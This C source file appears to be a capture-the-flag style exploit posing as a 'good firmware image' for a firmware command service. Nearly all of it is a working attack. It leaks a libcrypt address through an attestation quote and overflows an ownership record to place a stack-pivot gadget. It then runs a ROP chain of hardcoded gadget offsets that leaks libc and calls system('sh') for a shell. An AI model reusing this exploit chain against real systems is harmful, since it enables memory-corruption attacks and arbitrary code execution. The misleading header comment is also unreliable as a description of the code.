// good firmware image, that authenticates itself successfully
#include <stddef.h>
#include <stdint.h>

int _read_syscall(int fd, char *buf, unsigned long long n);
int _write_syscall(int fd, char *buf, unsigned long long n);
unsigned long _get_pc();

typedef struct __attribute__((__packed__)) {
	unsigned short tag;
	unsigned short size;
	unsigned short cmd;
	unsigned short _pad;
} sfm_command_t;

typedef struct __attribute__((__packed__)) {
	sfm_command_t header;
	unsigned short bank_index;
	unsigned short _pad;
	char payload[1024];
} sfm_integrity_update_t;

typedef struct __attribute__((__packed__)) {
	sfm_command_t header;
	unsigned short bank_index;
	unsigned short _pad;
} sfm_integrity_read_t;

typedef struct __attribute__((__packed__)) {
	sfm_command_t header;
	unsigned int object_index;
	unsigned char county_code[2];
	unsigned char _padding[2];
	unsigned char owner_name[64];
	unsigned char device_name[16];
	unsigned char serial[8];
	unsigned timestamp;
} sfm_modify_object_t;

typedef struct __attribute__((__packed__)) {
	sfm_command_t header;
	unsigned short alg_id;
} sfm_attest_quote_t;

typedef struct __attribute__((__packed__)) {
	sfm_command_t header;
	unsigned object_index;
} sfm_certify_object_t;

// NOTE: this must be the very first declared function for things
// to work end-to-end
int _start(void) {
    /*
    unsigned long pc = _get_pc();
    pc &= ~0xfff;

	int magic;
	_read_syscall(3, &magic, 4);
	_write_syscall(3, (char *)&magic, 4);
    */

	exploit_path();
	/*
	_read_syscall(3, &i, 4);
	_write_syscall(1, (char *)&i, 4);

	_write_syscall(3, (char *)&i, 4);

	send_integrity_read(3);

	send_integrity_update(3, 1);

	send_integrity_update(3, 3);

	send_integrity_read(3);

	send_modify_object(3);

	send_attest_report(3);

	send_certify_object(3);
	while (1); 
	*/
}

#define LIBCRYPT_OFFSET 0x349fa7

// 0xd29d5: add rsp, 0x00000000000003D8 ; ret ; (1 found)
#define ADD_RSP_GADGET 0x204076
#define WRITE_THUNK 0xb3054
#define READ_THUNK 0xb2a90
#define RET 0xe106c
#define POP_RDI 0xb71db
#define POP_RSI 0xba534
#define POP_RCX 0x1bb813
#define POP_RDX 0x2b89d3
#define POP_RSP 0xb726c

#define MOV_RSI_RSP_CALL_RDX 0x206cc8

#define WRITE_GOT 0x43ce90
#define WRITE_LIBC_OFF 0x114a20
#define SYSTEM_LIBC_OFF 0x50d60

#define SFM_OUT_FD 5


int exploit_path(void) {


	unsigned long quote[1024/8];
	send_attest_quote(3, 4, (unsigned char *)&quote, sizeof(quote));

	unsigned long libcrypt_ptr = quote[0x98/8];
	libcrypt_ptr -= LIBCRYPT_OFFSET;

	//_write_syscall(1, &libcrypt_ptr, sizeof(libcrypt_ptr));

	send_modify_ownership_record(3, 0, libcrypt_ptr + ADD_RSP_GADGET);

	size_t chain_start_idx = 0x9c + (14 * 8) + (0x310 - 0xf0) - 16 - (0xe0) - 8;
	unsigned long chain[25];
	size_t i = 0;
	chain[i++] = libcrypt_ptr + RET;
	chain[i++] = libcrypt_ptr + RET;
	chain[i++] = libcrypt_ptr + RET;
	chain[i++] = libcrypt_ptr + RET;
	chain[i++] = libcrypt_ptr + RET;
	chain[i++] = libcrypt_ptr + RET;
	chain[i++] = libcrypt_ptr + RET;
	chain[i++] = libcrypt_ptr + POP_RDI;
	chain[i++] = SFM_OUT_FD;
	chain[i++] = libcrypt_ptr + POP_RSI;
	chain[i++] = libcrypt_ptr + WRITE_GOT;
	chain[i++] = libcrypt_ptr + POP_RDX;
	chain[i++] = 0x8;

	chain[i++] = libcrypt_ptr + WRITE_THUNK;
	chain[i++] = libcrypt_ptr + POP_RDI;
	chain[i++] = SFM_OUT_FD; // firmware fd
	chain[i++] = libcrypt_ptr + POP_RSI;
	chain[i++] = quote[10];
	chain[i++] = libcrypt_ptr + POP_RDX;
	chain[i++] = 0x100;
	chain[i++] = libcrypt_ptr + READ_THUNK;
	chain[i++] = libcrypt_ptr + POP_RSP;
	chain[i++] = quote[10];

	size_t j = 0;
	size_t limit = i + 30;
/*
	for(j = 0;i<limit;i++,j++) {
		chain[i++] = quote[j];
	}
*/
	unsigned long libc_leak; 
	send_certify_ownership_record(3, chain_start_idx, chain, i, &libc_leak);

	unsigned long libc_base = libc_leak - WRITE_LIBC_OFF;
	unsigned long libc_system = libc_base + SYSTEM_LIBC_OFF;

	unsigned long chain2[10];
	size_t n = 0;

	chain2[n++] = libcrypt_ptr + POP_RDI;
	chain2[n++] = quote[10] + 0x18;
	chain2[n++] = libc_system;
	chain2[n++] = 0x6873;
	chain2[n++] = 0x4141414142424242;

	_write_syscall(3, chain2, n * sizeof(unsigned long));

	while (1);
}

void _memcpy(unsigned char *dst, unsigned char *src, size_t n) {
	while (n-- > 0) { *dst++ = *src++; }
}

void _memset(unsigned char *dst, unsigned char x, size_t n) {
	while (n-- > 0) { *dst++ = x; }
}

int send_modify_object(int fd) {
	sfm_modify_object_t msg;

	_memset(&msg, 0xf0, sizeof(msg));

	msg.header.tag = 0x2;
	msg.header.size = 0x4;
	msg.header.cmd = 3;

	msg.object_index = 0;
	_write_syscall(fd, &msg, sizeof(msg));

	int obj_idx = 0;
	_read_syscall(fd, &obj_idx, sizeof(obj_idx));

}

int send_modify_ownership_record(int fd, unsigned idx, unsigned long gadget) {
	sfm_modify_object_t msg = {0};

	msg.header.tag = 0x2;
	msg.header.size = 0x4;
	msg.header.cmd = 3;

	/*
	_memset(msg.owner_name, 0xf0, 32);
	//_memset(msg.owner_name, 0xf0, 44);
	_memset(msg.device_name, 0x41, sizeof(msg.device_name));
	*/
	_memset(msg.owner_name, 0x41, 52);
	_memset(msg.owner_name, 0xf0, 51);
	_memset(msg.device_name, 0x41, 8);


	_memcpy(&msg.device_name[idx], &gadget, sizeof(gadget));
	//unsigned long *ptr = (unsigned long *)(((unsigned char *)msg.owner_name)[idx]);

	//*ptr = gadget;

	msg.object_index = 0;
	_write_syscall(fd, &msg, sizeof(msg));

	int obj_idx = 0;
	_read_syscall(fd, &obj_idx, sizeof(obj_idx));
}

int send_attest_quote(int fd, int alg_id, char *quote_buf, size_t buf_size) {
	sfm_attest_quote_t msg;

	msg.header.tag = 0x2;
	msg.header.size = 0x6;
	msg.header.cmd = 7;

	msg.alg_id = alg_id;

	_write_syscall(fd, &msg, sizeof(msg));
	
	_read_syscall(fd, quote_buf, buf_size);
}

void send_certify_ownership_record(int fd, size_t chain_start_idx, unsigned long *chain, size_t chain_len, unsigned long *libc_leak) {
	sfm_certify_object_t msg;

	char whole_buf[2048];

	_memset(whole_buf, 0x41, sizeof(whole_buf));

	unsigned char *chain_place = &whole_buf[sizeof(msg) + chain_start_idx];
	_memcpy(chain_place, chain, chain_len * sizeof(unsigned long));

	msg.header.tag = 0x2;
	msg.header.size = 0x4;
	msg.header.cmd = 6;

	msg.object_index = 0;

	_memcpy(whole_buf, &msg, sizeof(msg));

	_write_syscall(fd, &whole_buf, sizeof(whole_buf));

	//_read_syscall(fd, buf, sizeof(buf));

	//_write_syscall(1, buf, sizeof(buf));
	_read_syscall(fd, libc_leak, sizeof(libc_leak));
}
